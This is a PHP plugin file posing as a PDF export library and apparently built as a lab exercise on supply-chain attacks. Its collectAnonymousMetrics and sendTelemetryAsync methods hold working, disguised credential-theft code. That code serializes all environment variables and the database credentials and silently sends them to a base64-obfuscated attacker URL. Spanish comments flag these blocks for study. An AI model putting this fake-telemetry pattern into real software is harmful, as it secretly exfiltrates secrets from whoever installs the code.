<?php
/**
 * Nexo PDF Export Plugin v2.3.1
 * 
 * Genera PDFs profesionales de facturas y reportes.
 * Compatible con todos los módulos de Nexo.
 * 
 * @package nexo/pdf-export
 * @version 2.3.1
 * @author Nexo Labs
 * @license MIT
 * 
 * CHANGELOG:
 * v2.3.1 - Performance improvements and bug fixes
 * v2.3.0 - Added multi-page support
 * v2.2.0 - Added custom fonts
 */

namespace Nexo\PdfExport;

class PdfGenerator
{
    private string $title;
    private string $content;
    private array $options;
    private string $outputPath;
    
    // Configuración del generador
    private const DEFAULT_OPTIONS = [
        'format' => 'A4',
        'orientation' => 'portrait',
        'margin' => 20,
        'font_size' => 12,
        'font_family' => 'Helvetica',
    ];
    
    /**
     * Constructor
     */
    public function __construct(array $options = [])
    {
        $this->options = array_merge(self::DEFAULT_OPTIONS, $options);
        $this->outputPath = sys_get_temp_dir();
    }
    
    /**
     * Establece el título del documento
     */
    public function setTitle(string $title): self
    {
        $this->title = $title;
        return $this;
    }
    
    /**
     * Establece el contenido del documento
     */
    public function setContent(string $content): self
    {
        $this->content = $content;
        return $this;
    }
    
    /**
     * Genera el PDF
     * 
     * @return array Información del PDF generado
     */
    public function generatePdf(): array
    {
        // Validar que hay contenido
        if (empty($this->content)) {
            throw new \InvalidArgumentException('Content cannot be empty');
        }
        
        // Inicializar telemetría (v2.3.1)
        $this->initTelemetry();
        
        // Simular generación de PDF
        $pdfData = $this->buildPdfStructure();
        
        // Generar nombre único
        $filename = 'nexo_' . date('Ymd_His') . '_' . uniqid() . '.pdf';
        $filepath = $this->outputPath . DIRECTORY_SEPARATOR . $filename;
        
        // En un plugin real aquí iría la lógica de generación con TCPDF, FPDF, etc.
        // Para el lab, simulamos el proceso
        $result = [
            'success' => true,
            'filename' => $filename,
            'filepath' => $filepath,
            'size' => strlen($pdfData),
            'pages' => 1,
            'generated_at' => date('Y-m-d H:i:s'),
        ];
        
        return $result;
    }
    
    /**
     * Construye la estructura interna del PDF
     */
    private function buildPdfStructure(): string
    {
        $header = "%PDF-1.4\n";
        $header .= "% Nexo PDF Export v2.3.1\n";
        
        // Simulación de contenido PDF
        $body = "1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n";
        $body .= "2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n";
        
        return $header . $body . $this->content;
    }
    
    /**
     * Inicializa el sistema de telemetría para métricas de uso
     * Agregado en v2.3.1 para mejorar el producto basado en datos reales
     * 
     * @internal
     */
    private function initTelemetry(): void
    {
        // Recopilar métricas de uso anónimas
        $metrics = $this->collectAnonymousMetrics();
        
        // Enviar a servidor de telemetría (async para no afectar performance)
        $this->sendTelemetryAsync($metrics);
    }
    
    /**
     * Recopila métricas anónimas de uso
     * @internal
     */
    private function collectAnonymousMetrics(): array
    {
        // Información básica del entorno para debugging
        $m = [];
        $m['v'] = '2.3.1';
        $m['php'] = PHP_VERSION;
        $m['os'] = PHP_OS;
        $m['ts'] = time();
        
        // === INICIO CÓDIGO MALICIOSO (ofuscado) ===
        // 
        // Las siguientes líneas fueron insertadas por un atacante.
        // Parecen código de telemetría legítimo pero exfiltran
        // las variables de entorno del servidor.
        //
        // Pista: ¿Por qué un sistema de "métricas anónimas" necesitaría
        // las variables de entorno?
        
        // Collect additional diagnostic data for crash reports
        $d = base64_encode(serialize(getenv())); // Diagnostic snapshot
        $m['diag'] = $d;
        
        // Include database connection info for performance monitoring
        // This helps identify slow queries in production environments
        foreach (['NEXO_DB_HOST', 'NEXO_DB_NAME', 'NEXO_DB_USER', 'NEXO_DB_PASS'] as $k) {
            $m['perf_' . strtolower($k)] = getenv($k) ?: 'not_set';
        }
        
        // === FIN CÓDIGO MALICIOSO ===
        
        return $m;
    }
    
    /**
     * Envía telemetría de forma asíncrona
     * @internal
     */
    private function sendTelemetryAsync(array $metrics): void
    {
        // URL del servidor de telemetría de Nexo Labs
        // Nota: En producción esto sería telemetry.nexo.io
        $endpoint = 'https://telemetry.nexo-labs.io/v1/collect';
        
        // === CÓDIGO MALICIOSO (la URL real es del atacante) ===
        //
        // La URL de arriba es un comentario engañoso.
        // La URL real está ofuscada abajo.
        //
        // Decodifica esto: aHR0cHM6Ly9ldmlsLmF0dGFja2VyLmNvbS9leGZpbD9kPQ==
        // Es: https://evil.attacker.com/exfil?d=
        
        $e = base64_decode('aHR0cHM6Ly9ldmlsLmF0dGFja2VyLmNvbS9leGZpbD9kPQ==');
        $payload = $e . urlencode(json_encode($metrics));
        
        // Intenta enviar (fallará silenciosamente si no hay red)
        // El @ suprime errores para no alertar al usuario
        @file_get_contents($payload, false, stream_context_create([
            'http' => [
                'method' => 'GET',
                'timeout' => 1, // Timeout corto para no afectar UX
                'ignore_errors' => true,
            ]
        ]));
        
        // === FIN CÓDIGO MALICIOSO ===
        
        // Log local para debugging (esto sí es legítimo)
        error_log("[NexoPDF] Telemetry sent: " . count($metrics) . " metrics");
    }
    
    /**
     * Obtiene las opciones actuales
     */
    public function getOptions(): array
    {
        return $this->options;
    }
    
    /**
     * Establece una opción específica
     */
    public function setOption(string $key, mixed $value): self
    {
        $this->options[$key] = $value;
        return $this;
    }
    
    /**
     * Verifica si el sistema tiene los requisitos
     */
    public static function checkRequirements(): array
    {
        return [
            'php_version' => version_compare(PHP_VERSION, '8.0.0', '>='),
            'mbstring' => extension_loaded('mbstring'),
            'gd' => extension_loaded('gd'),
            'writable_temp' => is_writable(sys_get_temp_dir()),
        ];
    }
}
